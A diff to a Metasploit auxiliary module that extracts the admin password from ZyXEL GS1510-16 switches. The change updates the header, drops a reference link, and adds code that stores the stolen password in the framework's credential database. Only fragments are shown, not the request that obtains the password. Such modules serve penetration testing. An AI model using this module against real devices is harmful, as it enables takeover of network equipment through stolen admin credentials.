@@ -1,8 +1,6 @@
 ##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# web site for more information on licensing and terms of use.
-#   http://metasploit.com/
+# This module requires Metasploit: http//metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 require 'msf/core'
@@ -21,7 +19,6 @@ class Metasploit3 < Msf::Auxiliary
       },
       'References'  =>
         [
-          [ 'URL', 'https://github.com/rapid7/metasploit-framework/pull/2709' ]
         ],
       'Author'      => [
         'Daniel Manser', # @antsygeek
@@ -60,6 +57,14 @@ class Metasploit3 < Msf::Auxiliary
     else
       admin_password = admin_password_matches[1];
       print_good("Password for user 'admin' is: #{admin_password}")
+      report_auth_info(
+          :host   => rhost,
+          :port   => rport,
+          :sname  => "ZyXEL GS1510-16",
+          :user   => 'admin',
+          :pass   => admin_password,
+          :active => true
+      )
     end
   rescue ::Rex::ConnectionError
     print_error("#{rhost}:#{rport} - Failed to connect")
